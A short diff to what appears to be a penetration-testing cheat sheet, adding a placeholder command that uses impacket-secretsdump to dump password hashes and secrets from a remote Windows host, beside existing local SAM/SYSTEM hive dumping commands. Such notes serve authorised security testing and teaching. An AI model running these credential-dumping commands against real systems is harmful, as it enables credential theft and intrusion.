@@ -1595,6 +1595,10 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 ```
 
+Dump remotely on Kali:
+```bash
+impacket-secretsdump <domain>/<user>:"<password>"@<ip>
+```
 ### Live SAM / LSA / LSASS with NetExec
 
 ```bash
